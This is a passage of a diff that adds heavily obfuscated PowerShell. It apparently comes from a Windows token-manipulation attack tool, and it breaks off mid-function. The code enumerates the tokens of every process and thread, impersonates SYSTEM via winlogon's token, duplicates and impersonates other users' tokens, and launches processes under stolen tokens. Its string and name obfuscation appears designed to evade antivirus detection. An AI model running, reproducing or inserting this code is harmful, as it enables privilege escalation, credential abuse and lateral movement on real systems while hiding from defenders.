+                                &("{1}{0}{2}" -f 'i','Wr','te-Warning') ('Call'+' '+'t'+'o '+'LookupPr'+'ivil'+'eg'+'eN'+'ameW '+'fail'+'ed.'+' '+'Error'+' '+'code:'+' '+"$ErrorCode. "+'Re'+'a'+'lSize:'+' '+"$PrivilegeNameSize")
+                            }
+                            ${pr`ivI`LEgena`mE} =   (  &("{1}{0}" -f 'ir','D') VariaBLe:kAjte )."val`Ue"::("{0}{3}{2}{1}"-f'P','ni','ingU','trToStr').Invoke(${pRI`V`ILE`gE`NameP`TR})
+
+                            
+                            ${p`RIvi`lEg`EStAtUS} = ""
+                            ${eNA`B`lED} = ${F`Al`se}
+
+                            if (${L`UIDAn`daTTrib`U`TE}."atT`RI`BUtes" -eq 0)
+                            {
+                                ${ENaB`l`eD} = ${f`A`LsE}
+                            }
+                            if ((${Lu`id`AndA`TTR`I`BUtE}."a`TTrib`UTES" -band ${WiN32C`oNsT`A`NTS}."sE_p`R`i`VileGe`_eNABL`e`D_bY_defAU`LT") -eq ${Wi`N32CONS`T`A`NTS}."se_pr`IvIl`eGe_enAbL`E`D_BY`_`dEfAUlt") 
+                            {
+                                ${E`NABl`ED} = ${t`RuE}
+                            }
+                            if ((${luida`N`dA`T`TRi`BUte}."aTtRi`Bu`TEs" -band ${w`In32CoNS`T`An`TS}."Se_priVI`lEg`E_eNAb`lEd") -eq ${WiN32`COnst`A`Nts}."s`E_`pRi`V`iLEg`e_ENAbL`Ed") 
+                            {
+                                ${e`NaB`LeD} = ${Tr`Ue}
+                            }
+                            if ((${lUi`D`ANd`ATtRi`B`Ute}."At`TrI`BuTEs" -band ${wI`N32`CoNs`TAnTs}."Se_pRiV`I`LE`ge_rem`O`V`ed") -eq ${WIN`32c`OnS`TA`NTS}."sE_prIVi`l`EGe`_r`em`OV`ED") 
+                            {
+                                &("{4}{3}{0}{2}{1}"-f'Wa','ning','r','e-','Writ') ("{8}{13}{10}{11}{5}{6}{9}{17}{2}{4}{3}{1}{16}{12}{7}{14}{15}{0}{18}"-f 'is as a ','h',' ','wit','token ',': ','Fou','MOVED. Pleas','Un','nd ','xp','ected behavior','PRIVILEGE_RE','e','e rep','ort th',' SE_','a','bug. ')
+                            }
+
+                            if (${E`NaBLeD})
+                            {
+                                ${RE`TuR`NOBj}."pRiVIL`EgeSE`Nab`L`Ed" += ,${pr`I`VILEgEnamE}
+                            }
+                            else
+                            {
+                                ${R`ET`U`RNObJ}."p`R`IviLEGEsavaIla`Ble" += ,${prIVIL`e`geName}
+                            }
+
+                             (  &("{1}{0}"-f'ARiABLE','V')  kajtE -vA  )::("{1}{2}{3}{0}"-f'l','FreeH','Glob','a').Invoke(${PriV`ilE`genA`m`ePTR})
+                        }
+                    }
+                      $kAJte::("{2}{3}{0}{1}"-f'a','l','FreeHGl','ob').Invoke(${t`Ok`EnP`RivILE`g`E`SpTR})
+
+                }
+                else
+                {
+                    &("{2}{3}{1}{0}" -f'rbose','te-Ve','Wr','i') "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length) "
+                }
+
+                
+                ${N`T`STaTUs} = ${LS`Af`Re`ereTURnBUFF`er}."iNv`OKE"(${L`O`GONSess`I`ond`AtapTR})
+                ${l`O`GO`NseSSioNdA`TAPtr} =   (&("{0}{1}"-f 'D','ir') ("varia"+"BL"+"E:s2"+"A") )."v`AlUE"::"z`ero"
+                if (${Nt`st`ATus} -ne 0)
+                {
+                    &("{2}{0}{3}{1}" -f 'rite-War','ing','W','n') ('Cal'+'l '+'to'+' '+'LsaFree'+'Return'+'B'+'uffer'+' '+'fail'+'ed. '+'Er'+'r'+'or '+'co'+'de: '+"$ntstatus")
+                }
+            }
+
+              (&("{2}{1}{3}{0}"-f 'Able','t-','gE','VARi')  KAjte )."VAL`UE"::("{1}{0}{2}{3}" -f'e','Fre','HG','lobal').Invoke(${Lu`Idp`TR})
+            ${L`Uid`PTR} =   ( &("{3}{2}{1}{0}" -f 'RiABLE','a','eT-V','G') s2a )."V`AluE"::"z`ero"
+        }
+
+         (&("{0}{1}"-f'get-IT','em') VaRIABLE:KaJTE)."V`ALUe"::("{0}{2}{1}"-f'Fr','bal','eeHGlo').Invoke(${to`keNST`A`T`spTr})
+        ${TO`K`eNS`TAtS`pTR} =   $S2A::"z`ErO"
+
+        return ${Re`TUR`No`Bj}
+    }
+
+
+    
+    function g`ET-un`iQU`et`OkENs
+    {
+        Param(
+            [Parameter(PoSitiON=0, mAnDatORY=${tR`Ue})]
+            [Object[]]
+            ${alLTo`KE`NS}
+        )
+
+        ${TOkENb`Yu`Ser} = @{}
+        ${t`OKE`Nb`YEnA`BLedprIv} = @{}
+        ${T`oKe`NbYAVaiLAb`lEpRIV} = @{}
+
+        
+        foreach (${tOK`en} in ${aL`Ltoke`Ns})
+        {
+            ${k`EY} = ${tOK`En}."D`omAiN" + "\" + ${To`Ken}."u`seRN`AMe"
+            if (-not ${to`K`ENbyUseR}.("{1}{0}{2}"-f 'sKe','Contain','y').Invoke(${k`ey}))
+            {
+                
+                
+                if (${Tok`En}."lOgONt`ype" -ne 3 -and
+                    ${To`K`En}."US`e`RNAmE" -inotmatch "^DWM-\d+$" -and
+                    ${t`o`ken}."USern`AMe" -inotmatch "^LOCAL\sSERVICE$")
+                {
+                    ${To`keNB`yuser}.("{0}{1}"-f'A','dd').Invoke(${k`ey}, ${T`Ok`eN})
+                }
+            }
+            else
+            {
+                
+                if(${tO`kEN}."iSe`LeV`ATed" -eq ${To`KEnByU`S`er}[${k`EY}]."is`ELe`VATed")
+                {
+                    if ((${TO`kEN}."pRiViL`Eg`esenA`BlED"."CO`UNt" + ${T`OKeN}."p`R`iv`ILEGesAvaILab`lE"."C`Ount") -gt (${tok`E`NBYU`seR}[${k`eY}]."P`RivIl`egeS`eNabled"."c`oUnt" + ${tOK`enb`yusER}[${K`eY}]."Pr`i`V`Ilege`savA`IlA`Ble"."C`oUnt"))
+                    {
+                        ${toK`enb`yUSeR}[${K`eY}] = ${To`K`En}
+                    }
+                }
+                
+                elseif ((${TOk`en}."iSe`lE`VAtEd" -eq ${tR`UE}) -and (${ToKen`BYU`seR}[${K`Ey}]."IsE`LE`VA`TEd" -eq ${fa`l`SE}))
+                {
+                    ${tOk`e`NbyuSer}[${K`Ey}] = ${T`O`KEN}
+                }
+            }
+        }
+
+        
+        foreach (${T`Ok`en} in ${ALlt`ok`ENs})
+        {
+            ${FuLLn`AmE} = "$($Token.Domain)\$($Token.Username)"
+
+            
+            foreach (${p`RIv`IleGe} in ${tO`kEN}."pR`iViLegeseNa`B`LED")
+            {
+                if (${tOKEN`BYE`NA`BLEDP`Riv}.("{1}{2}{0}{3}"-f 'n','Conta','i','sKey').Invoke(${P`R`iVI`LEGe}))
+                {
+                    if(${toKenbyE`NA`B`LeD`PRiV}[${p`Ri`Vi`LeGE}] -notcontains ${FuL`LnA`mE})
+                    {
+                        ${To`kenby`eNA`BleDPrIV}[${PRi`Vi`lEge}] += ,${fulL`NaMe}
+                    }
+                }
+                else
+                {
+                    ${t`OKENByENA`BLE`DPRiV}.("{0}{1}"-f 'A','dd').Invoke(${pR`iViLE`GE}, @(${F`UlLNa`Me}))
+                }
+            }
+
+            
+            foreach (${Pr`I`Vi`leGe} in ${t`O`KEn}."p`R`IVI`legeSaVAi`labLE")
+            {
+                if (${T`O`ken`By`AVAI`l`AblepRiV}.("{1}{2}{0}"-f'insKey','C','onta').Invoke(${P`Rivi`L`eGE}))
+                {
+                    if(${TO`KeNb`yaVAIL`ABLe`Priv}[${p`RiviL`Ege}] -notcontains ${FU`LlNa`mE})
+                    {
+                        ${toKen`BYA`V`Ail`AblePRIv}[${P`RIVIl`EGe}] += ,${FU`lLn`AmE}
+                    }
+                }
+                else
+                {
+                    ${tokEN`B`YAvAiLaB`lEprIV}.("{0}{1}"-f 'A','dd').Invoke(${p`R`IvILeGe}, @(${f`U`LLnaMe}))
+                }
+            }
+        }
+
+        ${RETU`RNd`IcT} = @{
+            ("{2}{0}{1}"-f'enBy','User','Tok') = ${t`Ok`EnbYUS`ER}
+            ("{1}{0}{4}{3}{2}"-f 'nab','TokenByE','Priv','d','le') = ${to`KEN`By`eNAbL`ed`P`RiV}
+            ("{2}{3}{0}{4}{1}"-f 'yA','ilablePriv','To','kenB','va') = ${Token`BYA`VAI`l`ABLePriV}
+        }
+
+        return (&("{2}{1}{0}" -f 'ject','w-Ob','Ne') ("{0}{1}"-f 'PS','Object') -Property ${reT`URnd`icT})
+    }
+
+
+    function Invo`KE-`iM`p`ErsonatE`U`Ser
+    {
+        Param(
+            [Parameter(posITIon=0, MANdaToRy=${tr`UE})]
+            [IntPtr]
+            ${ht`oK`en}
+        )
+
+        
+        [IntPtr]${NE`W`HTOk`en} =  $S2a::"ze`Ro"
+        ${Su`cc`ess} = ${dUPL`ic`A`TET`OkeneX}."IN`VOKe"(${HTO`k`en}, ${W`In`32coNSTaN`Ts}."MAxIMU`M_aLLo`W`eD",  $S2a::"ZE`Ro", 3, 1, [Ref]${N`E`Wh`TOKeN}) 
+        if (-not ${su`CcESS})
+        {
+            ${ERRo`RC`OdE} =   ( &("{0}{1}{2}"-f 'GEt','-cHILDitE','m') ('vAriaBlE'+':'+'K'+'Ajt'+'E') )."val`UE"::("{1}{3}{2}{0}{4}"-f 'rr','GetLas','32E','tWin','or').Invoke()
+            &("{0}{2}{3}{1}"-f 'W','g','rite-Wa','rnin') ('Dupl'+'ic'+'ateT'+'okenEx '+'fail'+'ed. '+'Err'+'orCo'+'d'+'e: '+"$ErrorCode")
+        }
+        else
+        {
+            ${s`UCCE`Ss} = ${iM`p`er`soNa`TeL`OGG`eDONUseR}."IN`V`OKe"(${N`EwHT`okeN})
+            if (-not ${SU`cCesS})
+            {
+                ${E`RrOR`cODe} =  (&('ls')  ('v'+'ari'+'ABLE:'+'KAJTe'))."v`ALUE"::("{1}{0}{3}{4}{2}" -f'astWin','GetL','r','32Err','o').Invoke()
+                &("{3}{0}{2}{4}{1}" -f'rite-Wa','ng','r','W','ni') ('Fa'+'i'+'led '+'t'+'o '+'Imp'+'ersonateLog'+'gedO'+'n'+'User. '+'E'+'rror '+'co'+'de:'+' '+"$Errorcode")
+            }
+        }
+
+        ${S`U`CcEss} = ${ClOS`eh`ANdLe}."I`NVOKe"(${New`Hto`KEN})
+        ${nEWH`To`keN} =   $S2A::"Ze`RO"
+        if (-not ${Su`cC`Ess})
+        {
+            ${ERRoR`c`o`dE} =  ( &("{2}{0}{1}" -f 'ab','le','VarI')  kaJte -va )::("{3}{4}{0}{2}{1}"-f'3','r','2Erro','G','etLastWin').Invoke()
+            &("{2}{3}{1}{0}"-f'rning','-Wa','Wr','ite') ('Cl'+'os'+'eHandle '+'fa'+'i'+'led '+'to'+' '+'clo'+'se '+'N'+'ewHToken'+'. '+'Er'+'rorC'+'ode'+': '+"$ErrorCode")
+        }
+
+        return ${sU`C`cesS}
+    }
+
+
+    function Cr`EaTE-`PrO`cess`WITht`O`keN
+    {
+        Param(
+            [Parameter(POsiTIOn=0, MaNdAtOry=${t`RUe})]
+            [IntPtr]
+            ${htO`KEN},
+
+            [Parameter(POSITiOn=1, MaNDAtory=${Tr`UE})]
+            [String]
+            ${pR`O`CeSsN`Ame},
+
+            [Parameter(POsITIOn=2)]
+            [String]
+            ${PRO`CEs`sAr`GS},
+
+            [Parameter(POsITIoN=3)]
+            [Switch]
+            ${paS`S`Thru}
+        )
+        &("{0}{1}{4}{3}{2}" -f 'Wr','it','e','rbos','e-Ve') ("{6}{2}{5}{4}{3}{7}{8}{1}{0}" -f 'thToken','ssWi','r','ate-P',' Cre','ing','Ente','r','oce')
+        
+        [IntPtr]${New`H`T`okEn} =  (&("{1}{0}"-f'R','dI') ("vaR"+"iabL"+"e"+":s2a")  )."va`LUE"::"Ze`Ro"
+        ${sUcc`EsS} = ${dupL`i`c`ATetokENex}."I`NVO`Ke"(${htO`keN}, ${wIn32cOn`St`An`Ts}."m`AxI`m`UM_ALlo`Wed",  ( &("{0}{1}{2}"-f 'ge','T-VariA','BLe') S2A  -VA)::"Ze`Ro", 3, 1, [Ref]${NE`WHTo`KeN})
+        if (-not ${s`UcCe`sS})
+        {
+            ${e`R`Ro`RCodE} =   $KAjte::("{1}{2}{3}{4}{5}{0}" -f'2Error','G','etLa','st','Wi','n3').Invoke()
+            &("{1}{2}{3}{0}"-f 'g','Write-','Warn','in') ('Duplica'+'teTo'+'k'+'en'+'Ex '+'failed'+'. '+'E'+'rro'+'rCode: '+"$ErrorCode")
+        }
+        else
+        {
+            ${S`TA`RtUpinFoS`Ize} =  (&('LS')  ('VaR'+'iAbL'+'E:ka'+'jte'))."va`luE"::"SI`ZEOf"([Type]${st`Art`Upin`Fo})
+            [IntPtr]${STAR`TuP`INF`OPtR} =  $kAjTe::("{3}{2}{0}{1}"-f 'Globa','l','locH','Al').Invoke(${StarTuP`IN`FoS`IZE})
+            ${MEM`S`ET}."iN`VOKe"(${sT`ART`UP`I`NfOpTR}, 0, ${STa`RTup`INfOs`Ize}) | &("{0}{1}" -f'Out','-Null')
+             $kajte::("{0}{1}{2}" -f 'Wr','i','teInt32').Invoke(${sTa`RtuPi`NfO`ptr}, ${StaRtU`piN`Fos`i`ZE}) 
+
+            ${P`RO`CeSS`IN`FoSIZe} =  (  &('gi')  VAriABle:kAjTe )."vA`lUE"::"siZ`EOf"([Type]${Pr`Oces`s_INFoR`MAt`i`oN})
+            [IntPtr]${p`R`oceSSi`N`FOpTR} =  (  &("{1}{0}"-f 'R','di')  ("V"+"ARiaBLe:K"+"aJTE")  )."V`Alue"::("{0}{2}{1}" -f'Allo','bal','cHGlo').Invoke(${pr`oCes`SiNfO`Size})
+
+            ${Pr`oC`ESs`NAmepTr} =   (&("{1}{2}{0}"-f 'm','Get-ChILdI','TE') ("vArIABLe:K"+"aj"+"t"+"e") )."vA`LuE"::("{2}{3}{4}{1}{0}" -f'lUni','HGloba','Strin','g','To').Invoke("$ProcessName")
+            ${proC`ESS`ARGSpTR} =   (  &("{1}{2}{0}" -f 'tEm','GE','T-I')  ("Va"+"riabl"+"E"+":s2A"))."va`luE"::"ZE`RO"
+            if (-not   ( &("{0}{1}"-f 'D','IR') ('V'+'arIABL'+'e:NM'+'bVL')  )."Va`lUe"::("{2}{1}{4}{3}{0}" -f 'y','ull','IsN','pt','OrEm').Invoke(${pro`cE`ssarGs}))
+            {
+                ${PRocE`sSaR`gS`Ptr} =  (  &("{1}{0}{2}" -f'aB','vaRi','LE') ('Ka'+'jte') -val  )::("{4}{1}{0}{2}{3}"-f'ingToHGlo','tr','bal','Uni','S').Invoke(("`"$ProcessName`" "+"$ProcessArgs"))
+            }
+            
+            ${f`Uncti`onN`AMe} = ""
+            if (  $9ZTQd::("{1}{2}{0}{3}" -f 'es','GetCurrent','Proc','s').Invoke()."s`eSsi`o`NId" -eq 0)
+            {
+                
+                
+                
+                &("{3}{2}{1}{0}" -f'se','o','Verb','Write-') ("{21}{7}{2}{11}{28}{20}{3}{26}{16}{33}{15}{22}{18}{14}{23}{8}{24}{5}{29}{31}{17}{25}{13}{1}{9}{27}{6}{0}{19}{32}{30}{34}{12}{4}{10}"-f'e','sUs','ng in','abling Se','th alternate tok','lin','r','nni','d ','erW to ','en.',' Session 0.',' wi','A','ivile','o','i','r','nPr','a','n','Ru','ke','ge an','cal','ocess','AssignPr','c',' E','g Cre',' ','ateP','te','maryT','a process')
+                &("{3}{1}{0}{4}{2}" -f'P','nable-','ivilege','E','r') -Privilege ("{4}{0}{6}{5}{3}{2}{1}"-f 'ssignP','lege','yTokenPrivi','r','SeA','ima','r')
+                ${s`Uc`Cess} = ${CR`EAT`E`PRoC`esSa`su`SErW}."InvO`kE"(${nEwhT`O`KEN}, ${PRO`Ce`sSNaM`epTR}, ${P`ROcESSArGs`P`Tr},  (&("{2}{1}{3}{0}"-f 'e','-vAri','geT','aBL') S2A  -VaLu )::"ZE`RO",  (&("{0}{2}{1}"-f 'GET','IteM','-') vAriable:S2a )."val`Ue"::"ze`RO", ${f`Alse}, 0,  $s2A::"Z`Ero",   ( &('LS') vArIAblE:S2a)."v`ALUe"::"z`eRO", ${START`UPiN`FoPTr}, ${Pro`c`E`SSiN`FOptR})
+                ${fU`NCt`ioNNAME} = ("{2}{3}{1}{0}{4}" -f'AsUse','eProcess','Cr','eat','rW')
+            }
+            else
+            {
+                &("{3}{0}{1}{2}"-f 'rite-Ver','bos','e','W') ("{22}{5}{11}{12}{21}{3}{6}{1}{20}{4}{19}{15}{16}{2}{14}{18}{13}{17}{7}{0}{10}{9}{8}" -f ' proces','al','WithT','ion 0, ','ing','u','c','eate a',' token.',' alternate','s with','nni','ng in Se','en','o','te','Process','W to cr','k',' Crea','l','ss','Not r')
+                ${Su`c`cEsS} = ${cReATE`pRo`C`eSswITht`o`k`eNw}."IN`VOKE"(${n`EW`hTok`en}, 0x0, ${p`RoC`e`sSnaM`ePTr}, ${P`RoCe`ssArg`SPTR}, 0,  (  &("{0}{1}"-f'g','cI') ("V"+"ariablE"+":S"+"2a") )."v`ALUe"::"z`ErO",   (  &("{0}{1}" -f'gET','-iTEM')  VArIaBlE:s2a )."v`Alue"::"Z`Ero", ${STARTU`pInf`oPTR}, ${pRo`ce`SS`infOp`Tr})
+                ${fU`NC`TiOnn`AmE} = ("{5}{6}{1}{4}{3}{0}{2}"-f'e','ePr','ssWithTokenW','c','o','Cre','at')
+            }
+            if (${SucCe`sS})
+            {
+                
+                ${pR`o`Ce`sSInFo} =  $kaJte::"pTRToSTru`c`Tu`Re"(${PrO`cess`I`NfOpTr}, [Type]${p`RoC`eS`s_infOr`MAt`iON})
+                ${Cl`O`SEHa`NDLE}."in`VOke"(${pr`OC`e`sSInfO}."hPr`oceSs") | &("{0}{1}"-f 'Out-','Null')
+                ${ClOsE`Han`dle}."invo`kE"(${P`ROce`sSiNFO}."H`T`HrEad") | &("{0}{1}{2}" -f'Ou','t-Nul','l')
+
+		
+		if (${p`Asst`hRU}) {
+			
+			${retu`R`NprOc`esS} = &("{0}{2}{1}"-f'Get-Proc','s','es') -Id ${PRoCE`Ss`iNfo}."dWP`R`oCESsiD"
+
+			
+			${nU`Ll} = ${r`eTUR`NprOc`esS}."H`AN`DLE"
+
+			
+			${rEtuRnp`RO`Cess}
+		}
+            }
+            else
+            {
+                ${er`ROrcO`dE} =  (  &("{2}{1}{0}" -f'e','abL','VARI') kajtE  )."vA`LUe"::("{1}{0}{4}{3}{2}"-f'stWin','GetLa','r','Erro','32').Invoke()
+                &("{1}{0}{2}"-f 'nin','Write-War','g') ("$FunctionName "+'f'+'ail'+'ed. '+'Error'+' '+'code'+': '+"$ErrorCode")
+            }
+
+            
+             (&("{0}{2}{1}" -f 'G','tEM','Et-i')  VARIAblE:kAjtE  )."vA`lUe"::("{2}{1}{0}" -f'obal','reeHGl','F').Invoke(${sTarT`UPI`NfO`PTR})
+            ${S`Ta`RTup`INfOPTr} =  ( &("{0}{1}" -f'vaRI','aBLE') ("s"+"2a"))."Val`Ue"::"z`eRO"
+              (&("{0}{1}"-f 'D','iR')  ('v'+'ar'+'IA'+'b'+'LE:kaJte'))."V`ALuE"::("{2}{0}{3}{1}" -f'r','bal','F','eeHGlo').Invoke(${PR`Ocess`INFo`ptr})
+            ${PRoc`essI`NFoPTR} =  (&("{1}{0}{3}{2}"-f 't-Vari','Ge','e','ABl') s2a )."VA`Lue"::"Ze`RO"
+             (&("{0}{1}" -f'Di','r')  VaRIablE:KaJtE )."V`Alue"::("{1}{2}{0}{3}{4}{5}"-f 'alA','Z','eroFreeGlob','llocUni','cod','e').Invoke(${PR`o`C`eSsnaMepTR})
+            ${Pro`cESSNa`mePTr} =  $S2A::"zE`Ro"
+
+            
+            ${SUC`Ce`SS} = ${clOSe`hA`N`DLe}."iNv`oke"(${NEWHt`o`KEn})
+            ${N`ew`hTokEN} =   ( &("{2}{1}{0}"-f'lE','ab','VaRI') S2a -Val )::"z`eRO"
+            if (-not ${S`UCC`ess})
+            {
+                ${E`RRoRcO`DE} =  $kAJTE::("{0}{1}{5}{3}{2}{4}"-f 'Ge','tLas','2Erro','n3','r','tWi').Invoke()
+                &("{0}{1}{2}"-f'Write-W','ar','ning') ('C'+'loseHan'+'dle'+' '+'fail'+'ed '+'t'+'o '+'c'+'lo'+'se '+'N'+'ewHT'+'oken.'+' '+'Er'+'ror'+'Code:'+' '+"$ErrorCode")
+            }
+        }
+    }
+
+
+    function f`R`Ee-aLLtOKEnS
+    {
+        Param(
+            [Parameter(PoSitIon=0, mANDaTORY=${tr`Ue})]
+            [PSObject[]]
+            ${token`IN`FooB`jS}
+        )
+
+        foreach (${O`Bj} in ${tokeN`I`N`FooB`jS})
+        {
+            ${S`UCCESS} = ${CL`OSeHa`Nd`lE}."I`NV`OKE"(${o`Bj}."HTOK`EN")
+            if (-not ${s`Ucc`eSs})
+            {
+                ${ERROR`C`OdE} =  $kAJTe::("{4}{0}{2}{3}{1}"-f 'e','Error','tLastWi','n32','G').Invoke()
+                &("{1}{0}{2}{3}" -f 'it','Wr','e-Verbos','e') ('F'+'ail'+'ed '+'t'+'o '+'c'+'lose '+'toke'+'n '+'hand'+'le '+'i'+'n '+'Free-All'+'T'+'ok'+'ens. '+'ErrorCode'+':'+' '+"$ErrorCode")
+            }
+            ${O`BJ}."HTOK`en" =   (  &("{1}{0}{2}"-f 'ria','vA','BLE')  S2A -vA )::"Ze`Ro"
+        }
+    }
+
+
+    
+    function en`U`m`-alLt`OKeNs
+    {
+        ${al`l`TOKeNS} = @()
+
+        
+        
+        ${s`ySt`EmTOkE`NiN`Fo} = &("{3}{0}{1}{2}" -f 'et-P','rimaryToke','n','G') -ProcessId (&("{1}{0}{2}" -f 'o','Get-Pr','cess') ("{1}{0}{2}" -f 'ni','wini','t') | &("{0}{1}"-f 'w','here') {${_}."sESsi`o`Nid" -eq 0})."I`D"
+        if (${SysT`EmT`OkeN`infO} -eq ${NU`LL} -or (-not (&("{1}{2}{0}{4}{3}"-f'a','Invoke-Imperso','n','User','te') -hToken ${S`YSt`EMToKe`Ni`NFo}."Hp`R`OCt`oKen")))
+        {
+            &("{1}{4}{3}{0}{2}" -f'arnin','Writ','g','W','e-') ("{11}{17}{1}{0}{9}{6}{8}{19}{15}{3}{13}{4}{18}{10}{2}{5}{16}{12}{7}{14}"-f 'onate ',' impers','o enum',' ',' be a','er','STEM, th','ok','e ','SY',' t','Unable','all t','not','ens','cript will','ate ',' to','ble','s')
+        }
+
+        if (${sYSteMtO`keNi`N`FO} -ne ${NU`LL} -and ${sYSTE`m`TOk`e`Ninfo}."Hp`RO`cto`kEN" -ne   (  &("{2}{0}{1}"-f 'Et-VARIAB','LE','g')  S2a)."V`AluE"::"Z`eRo")
+        {
+            ${CL`o`sE`HanDLE}."i`Nvoke"(${sy`sTeMtOKen`I`N`FO}."hp`RoCTOk`EN") | &("{2}{0}{1}" -f 'ut-','Null','O')
+            ${sys`TEMt`OKe`NI`NFO} = ${Nu`ll}
+        }
+
+        ${Proc`eSSi`dS} = &("{1}{0}{3}{2}" -f '-p','get','ss','roce') | &("{0}{1}" -f'wh','ere') {${_}."NA`me" -inotmatch "^csrss$" -and ${_}."nA`mE" -inotmatch "^system$" -and ${_}."i`d" -ne 0}
+
+        
+        foreach (${PR`ocE`ss} in ${P`RoCEss`i`ds})
+        {
+            ${PRIMARY`To`Keni`NFO} = (&("{3}{1}{0}{2}{4}"-f'rim','-P','ar','Get','yToken') -ProcessId ${PRo`ceSS}."ID" -FullPrivs)
+
+            
+            if (${PRimaryt`oK`eNi`N`Fo} -ne ${nU`Ll})
+            {
+                [IntPtr]${hTO`K`en} = [IntPtr]${PRI`MAr`Y`ToKENinFo}."hprO`C`ToKeN"
+
+                if (${htOK`En} -ne   ( &("{2}{4}{0}{3}{1}"-f'Hi','Ditem','gE','l','T-C')  ('v'+'ARIABlE:S'+'2A')  )."val`UE"::"zE`Ro")
+                {
+                    
+                    ${r`eT`UrnOBj} = &("{3}{1}{2}{0}"-f'ormation','To','kenInf','Get-') -hToken ${h`T`okEn}
+                    if (${r`eTU`RNO`BJ} -ne ${n`UlL})
+                    {
+                        ${r`eT`URNobJ} | &("{0}{1}{2}" -f 'Add-','Mem','ber') -MemberType ("{1}{0}{2}{3}"-f 'eP','Not','rope','rty') -Name ("{2}{0}{1}" -f'ocessI','d','Pr') -Value ${p`R`oCESS}."i`D"
+
+                        ${Al`LToKe`NS} += ${Re`TuRn`obJ}
+                    }
+                }
+                else
+                {
+                    &("{1}{0}{2}" -f'ri','W','te-Warning') "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id) "
+                }
+
+                foreach (${th`Re`Ad} in ${p`RoceSs}."th`REaDS")
+                {
+                    ${thR`eAD`TOkEnIN`Fo} = &("{3}{0}{2}{4}{1}" -f 'hread','en','T','Get-T','ok') -ThreadId ${th`R`Ead}."I`D"
+                    [IntPtr]${H`To`Ken} = (${tHrEad`T`Oke`NiN`Fo}."HTHr`EaDTO`k`En")
+
+                    if (${h`TO`KEN} -ne  ( &("{2}{0}{1}" -f 'rIa','BlE','VA') ('S2'+'a')  -vALueOnL  )::"Z`ERO")
+                    {
+                        ${ret`UR`NO`BJ} = &("{5}{1}{2}{3}{0}{6}{4}" -f'nformat','et-To','ken','I','n','G','io') -hToken ${ht`oken}
+                        if (${r`ETuRN`oBj} -ne ${nu`Ll})
+                        {
+                            ${R`EtUr`NOBJ} | &("{2}{1}{0}{3}" -f 'mbe','e','Add-M','r') -MemberType ("{2}{1}{0}{3}"-f'Pro','e','Not','perty') -Name ("{1}{0}" -f'hreadId','T') -Value ${THr`E`AD}."i`d"
+                    
+                            ${ALLT`O`KenS} += ${rE`Tur`NObj}
+                        }
+                    }
+                }
+            }
+        }
+
+        return ${ALlt`OKE`Ns}
+    }
+
+
+    function I`Nv`okE-revErTToS`e`lf
+    {
+        Param(
+            [Parameter(PoSitiOn=0)]
+            [Switch]
+            ${shoWO`Utp`UT}
+        )
+
+        ${s`UcceSs} = ${rEVErt`TO`SeLf}."iNv`oke"()
+
+        if (${sH`ow`ouTPuT})
+        {
+            if (${Suc`CeSS})
+            {
+                &("{1}{0}{2}"-f 'utp','Write-O','ut') "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
+            }
+            else
+            {
+                &("{1}{2}{0}" -f'ut','Write-Ou','tp') "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
+            }
+        }
+    }
+
+
+    
+    function Ma`iN
+    {
+        if (-not ([Security.Principal.WindowsPrincipal]   (  &("{1}{2}{0}{3}"-f 'e','gET-Ch','IlDiT','M')  ("vARIAbl"+"e:"+"M6Z") )."vAL`UE"::("{2}{0}{1}"-f 'e','nt','GetCurr').Invoke())."I`siNro`LE"([Security.Principal.WindowsBuiltInRole] ("{0}{1}{2}" -f'Admin','i','strator')))
+        {
+            &("{2}{1}{3}{0}"-f 'r','r','W','ite-Erro') ("{1}{6}{0}{7}{5}{4}{3}{2}" -f'i','Script must be run as admi','r','ato','r','t','n','s') -ErrorAction ("{0}{1}" -f'Sto','p')
+        }
+
+        
+        if (  ( &("{1}{0}{2}{3}" -f'e','g','T-vAR','iABlE') 9ZTqd  )."v`ALuE"::("{2}{4}{3}{0}{1}" -f 'r','ocess','GetC','rentP','ur').Invoke()."s`Ess`ionID" -eq 0)
+        {
+            &("{0}{2}{3}{1}"-f'Wri','se','te-','Verbo') ("{14}{11}{5}{4}{12}{9}{10}{17}{8}{6}{1}{16}{7}{15}{3}{2}{0}{13}"-f'have a',' NoUI (pr','t ','anno',' Session','nning in','g','Session ','n','fo','rc','u',' 0, ',' UI)','R','0 c','ocesses in ','i')
+            ${n`ouI} = ${t`RUe}
+        }
+
+        if (${P`S`cmDlET}.paraMEteRsEtNAME -ieq ("{2}{0}{3}{1}" -f 'ev','f','R','ToSel'))
+        {
+            &("{0}{1}{2}{4}{3}"-f'I','n','vok','elf','e-RevertToS') -ShowOutput
+        }
+        elseif (${pS`CM`DLeT}.ParaMETERSEtNamE -ieq ("{1}{0}{2}" -f 'reat','C','eProcess') -or ${p`s`cmDLET}.parAmeTerSeTNAMe -ieq ("{0}{1}{2}{3}"-f'Imper','son','ate','User'))
+        {
+            ${AL`lTO`KEns} = &("{3}{0}{2}{1}" -f'num-All','kens','To','E')
+            
+            
+            [IntPtr]${hTo`K`EN} =  (  &("{1}{0}"-f'r','Di')  ("VARIAble"+":"+"s"+"2a")  )."V`ALuE"::"z`erO"
+            ${uNI`QUeTo`KENs} = (&("{3}{2}{4}{1}{0}"-f'ueTokens','q','et','G','-Uni') -AllTokens ${ALlT`oke`NS})."toKen`BYuS`er"
+            if (${U`se`RNAMe} -ne ${NU`LL} -and ${U`Se`RnaMe} -ne '')
+            {
+                if (${U`N`IQuE`ToKENS}.("{3}{2}{0}{1}" -f 'sKe','y','ntain','Co').Invoke(${USe`RNA`ME}))
+                {
+                    ${Ht`O`KEN} = ${u`N`IQ`UEtOKens}[${u`seRnaMe}]."Hto`KeN"
+                    &("{1}{0}{2}{3}" -f 'e-Ve','Writ','rbos','e') ("{5}{2}{0}{4}{1}{3}"-f'g tok','use','ectin','rname','en by ','Sel')
+                }
+                else
+                {
+                    &("{2}{1}{0}"-f'te-Error','i','Wr') "A token belonging to the specified username was not found. Username: $($Username) " -ErrorAction ("{1}{0}"-f'top','S')
+                }
+            }
+            elseif ( ${PRO`cE`SsId} -ne ${nu`ll} -and ${P`RoC`eSsId} -ne 0)
+            {
+                foreach (${T`Ok`en} in ${aL`LtO`k`ENS})
+                {
